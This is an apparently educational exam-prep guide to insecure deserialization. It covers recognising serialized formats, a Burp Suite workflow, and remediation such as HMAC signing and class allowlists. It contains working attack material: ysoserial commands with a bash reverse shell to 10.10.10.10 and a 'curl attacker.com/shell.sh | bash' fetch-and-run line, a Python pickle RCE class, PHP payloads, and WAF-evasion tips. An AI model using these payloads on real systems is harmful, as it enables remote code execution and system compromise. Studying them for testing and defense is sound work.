Insecure Deserialization

Exploit unsafe object reconstruction to achieve remote code execution or privilege escalation by manipulating serialized data.

Critical BSCP Exam Topic Difficulty: Advanced

Real-World Analogy

Sealed Envelopes and Blind Trust

A bank uses sealed envelopes to pass customer data between departments. The policy states: "Whatever is in a sealed envelope, process it immediately when opened ·don't verify the contents." One day, an attacker replaces a legitimate envelope with one containing forged instructions: "Empty the vault and send all money to this account." The bank opens the envelope and, following policy, executes the instructions without questioning them. Insecure deserialization is identical: the application deserializes (opens) untrusted serialized objects without validation, allowing an attacker to inject arbitrary instructions disguised as legitimate data.

⚡ Day 2 · Identify Serialized Data

On Day 2, look through all cookies, hidden fields, and POST parameters for serialized data. Recognizing the format is the first step:

  • Java: Base64 starting with rO0AB, or raw bytes \xac\xed\x00\x05
  • PHP: looks like O:4:"User":1:{s:4:"name";s:4:"test";}

  • .NET ViewState: base64 in hidden __VIEWSTATE field

Mark any base64 cookie that decodes to binary/garbled text · it might be a serialized object.

How It Works

Serialization converts objects into a stream of bytes or text for storage or transport. Deserialization reconstructs the original object from that stream. The vulnerability occurs when an attacker controls the serialized data and the application deserializes it without validation.

Serialization Formats

Different languages use different serialization formats:

  • Java: Binary serialized objects, recognizable by magic bytes \xac\xed or base64 prefix rO0AB when encoded
  • PHP: String format: O:4:"User":2:{s:4:"name";s:5:"Alice";s:3:"id";i:123;}
  • Python: Pickle format, starts with \x80\x04 (protocol 4) when binary
  • Ruby: Marshal format, recognizable by version bytes
  • .NET: Binary, JSON, or XML formats

Why Deserialization is Dangerous

During deserialization, the application instantiates classes and calls special methods known as "magic methods":

  • Java: readObject() method is invoked automatically
  • PHP: __wakeup() and __destruct() magic methods execute
  • Python: __reduce__() and arbitrary code in pickle can be executed

Attackers exploit these methods using gadget chains ·sequences of existing classes whose methods chain together to execute arbitrary code.

Example · Java Gadget Chain

The CommonsCollections library contains classes that, when chained, can execute commands. If the application deserializes untrusted data and CommonsCollections is in the classpath, an attacker uses tools like ysoserial to generate a malicious serialized object that runs a command.

// Attacker generates a gadget chain with ysoserial:
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh | bash' | base64

// This produces base64-encoded serialized data that, when deserialized, executes the command.

Example · PHP Magic Method Exploitation

In PHP, an attacker crafts serialized data that exploits magic methods:

O:4:"User":2:{s:8:"username";s:5:"admin";s:3:"cmd";s:15:"whoami > /tmp/x";}

// When deserialized, __destruct() is called and might execute 'cmd' if the class is vulnerable.

Where to Look

Serialized data appears in predictable places. Search for base64-encoded or binary data in:

Common Locations

  • Cookies: Session tokens, user preferences (look for base64 or magic bytes rO0AB)
  • Hidden Form Fields: State data passed between pages
  • HTTP Headers: Custom headers or Authorization tokens
  • API Responses: JSON responses containing serialized objects as strings
  • Cache Data: Redis or Memcached values that look encoded
  • Database Columns: Fields storing serialized user data or preferences

Recognition Signs

  • Base64 strings that decode to binary garbage → likely serialized Java
  • Strings starting with O: with colons and quotes → PHP serialization
  • Data that looks structured (colons, semicolons, numbers) → serialized format

Burp Suite Workflow

1
Identify Serialized Data
Use Burp's search function (Ctrl+F) or Proxy history to find base64-encoded strings or magic bytes. Look for rO0AB in cookies or parameters. Decode base64 and check for \xac\xed bytes (Java).
2
Send to Repeater
Send the request containing serialized data to Repeater (Ctrl+R). Modify the serialized data and resend to observe behavior. Look for error messages that reveal class names.
3
Test with Gadget Chains
For Java: Use ysoserial to generate a malicious payload with a known gadget chain (CommonsCollections1, Spring, Spring2, etc.). URL-encode or base64-encode the output and replace the original serialized data.
4
Monitor for Execution
Send the payload and watch for outbound connections (DNS queries, HTTP requests) using a collaborator. If the command executes, you've achieved RCE.
5
For PHP: Test Magic Methods
Craft serialized PHP data targeting __destruct() or __wakeup(). Modify class properties and resend. Check for file writes, command execution, or information disclosure.
6
Use Extensions
Install Burp's "Deserialization Scanner" or "Java Deserialization Scanner" extension for automated detection and payload generation.

Payloads & Techniques

Java Gadget Chain Payloads (ysoserial)

Generate payloads using the ysoserial tool. First, identify which libraries are in the target's classpath by looking at error messages or source code.

// CommonsCollections1 gadget chain (command execution)
java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64 -w0

// CommonsCollections5 (alternative chain)
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/shell.sh | bash' | base64 -w0

// Spring gadget chain (if Spring is available)
java -jar ysoserial.jar Spring1 'touch /tmp/pwned' | base64 -w0

// ROME gadget chain
java -jar ysoserial.jar ROME 'id > /tmp/output.txt' | base64 -w0

Copy the base64 output, URL-encode it, and replace the original serialized data in a cookie or parameter.

PHP Serialization Manipulation (phpggc)

Use phpggc to generate PHP gadget chains, or craft manual serialized PHP data:

// Using phpggc for Laravel:
phpggc Laravel/RCE1 'system' 'whoami'

// Manual PHP serialization targeting __destruct():
O:12:"VulnerableClass":1:{s:7:"command";s:6:"whoami";}

// Serialize a custom payload in Python:
import pickle
import base64
# Create a payload (simplified ·real exploitation varies by library)
payload = b"malicious_code"
print(base64.b64encode(payload))

Python Pickle Exploitation

Python's pickle module allows arbitrary code execution. Create a malicious pickle object:

import pickle
import os
import base64

# Define a class that executes code on unpickling
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

# Serialize and encode
payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()
print(encoded)

Testing Techniques

  • Collaborator Callbacks: Use Burp Collaborator to detect if a command executes (DNS/HTTP outbound connections)
  • Time-based Detection: Use sleep(5) or ping commands to verify execution via response delay
  • Output Capture: Redirect command output to a file on a writable location, then retrieve it via file read vulnerability
  • Error Messages: Intentionally trigger errors (e.g., cat /nonexistent) to see error output in responses

WAF Bypass & Variations

Gadget Chain Rotation

WAFs may block known gadget chains. Rotate between different chains available on the target:

  • CommonsCollections Variants: CommonsCollections1 through CommonsCollections7 use different method chains
  • Spring Framework: Spring1, Spring2 if Spring libraries are present
  • Custom Gadget Chains: Tools like marshalsec generate additional chains

Serialization Format Obfuscation

  • Encoding Variations: Some applications accept URL-encoded, hex-encoded, or double-encoded serialized data
  • Format Conversion: If the app accepts both Java and JSON, convert payload to JSON format for bypass
  • Comment Injection: Add comments or dummy objects to serialized data to evade signature-based detection

Nested Deserialization

Some applications deserialize multiple times. Wrap a payload in another layer of serialization to bypass single-layer detection.

Alternative Exploitation Methods

  • XXE Injection: If the app deserializes XML formats, exploit via XXE
  • JNDI Injection: Java applications may be vulnerable to JNDI injection during deserialization

Exploitation & Impact

Exploitation Scenarios

Remote Code Execution (RCE)

This is the primary risk. Once you craft a malicious serialized object, sending it to the application results in arbitrary command execution with the application's privileges.

Account Takeover via Privilege Escalation

Exploit magic methods to modify object properties (e.g., changing isAdmin to true). This is especially effective in PHP where serialized user objects are manipulated.

Information Disclosure

Use deserialization to instantiate classes that expose sensitive data or trigger error messages revealing file paths, class names, or system information.

Denial of Service

Craft gadget chains that consume excessive memory or CPU, causing the application to hang or crash.

Impact

  • Critical: Complete system compromise, data breach, malware installation
  • High: Lateral movement, privilege escalation, unauthorized access
  • Medium: Data exfiltration, DoS, defacement

Real-World Example: Java RCE via CommonsCollections

A Java web application stores user preferences in a cookie using Java serialization. An attacker intercepts the cookie, uses ysoserial to generate a CommonsCollections gadget chain, and replaces the cookie value. When the application deserializes the cookie, the gadget chain executes, establishing a reverse shell to the attacker's server.

Remediation

Primary: Avoid Deserializing Untrusted Data

The best fix is never to deserialize untrusted data. If you must deserialize:

Use Safe Serialization Formats

  • JSON with Schema Validation: Use JSON instead of binary serialization. Validate against a strict schema.
  • Protocol Buffers or MessagePack: These formats are safer and don't execute code during deserialization.

Implement Integrity Checks

Sign serialized data with an HMAC or digital signature:

// Pseudocode: Sign serialized data
byte[] serialized = serialize(object);
byte[] hmac = hmac(SECRET_KEY, serialized);
// Send: serialized + hmac

// On deserialization:
if (!hmac(SECRET_KEY, serialized).equals(receivedHmac)) {
  throw new SecurityException("Data tampered");
}
Object obj = deserialize(serialized);

Use Allowlist-based Deserialization

Configure the deserialization mechanism to only accept whitelisted classes:

// Java example using ObjectInputFilter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
  "java.base/*;!*"
);
ois.setObjectInputFilter(filter);

Keep Dependencies Updated

  • Patch all libraries to their latest versions (CommonsCollections, Spring, etc.)
  • Regularly scan dependencies for known gadget chains

Network Segmentation

Run the application in a restricted environment with limited outbound access to reduce the impact of RCE.

Disable Unnecessary Gadget Libraries

Remove unused libraries from the classpath (e.g., don't include CommonsCollections if it's not needed).

Common Beginner Mistakes

Not Recognizing Serialized Data

Mistake: Assuming base64-encoded strings are just encoded user data, not serialized objects.

Fix: Decode base64 and look for magic bytes (\xac\xed for Java, O: for PHP). Test all encoded data found in cookies and parameters.

Using Only One Gadget Library

Mistake: Generating only CommonsCollections payloads and assuming that's the only gadget chain available.

Fix: Enumerate all libraries in the target's classpath. Generate payloads for multiple gadget chains (CommonsCollections, Spring, ROME, etc.) and test each.

Ignoring PHP Magic Methods

Mistake: Focusing only on Java exploitation and overlooking PHP deserialization via magic methods.

Fix: Learn PHP magic methods (__wakeup, __destruct, __toString). Test PHP serialized data by crafting payloads that exploit these methods.

Not Using Correct Encoding**

Mistake: Generating a ysoserial payload but not base64-encoding it before inserting it into a cookie.

Fix: Always match the original encoding format. If the original was base64, base64-encode the payload. If it was hex, hex-encode it.

Forgetting to URL-Encode**

Mistake: Pasting a base64 payload directly into a URL parameter without URL-encoding special characters.

Fix: URL-encode the entire payload before inserting it into parameters.

No Monitoring for Blind Execution**

Mistake: Testing a payload but not monitoring outbound connections or time delays to detect execution.

Fix: Always use Burp Collaborator to detect DNS/HTTP callbacks, or use time-based detection (sleep commands) when output is not visible.
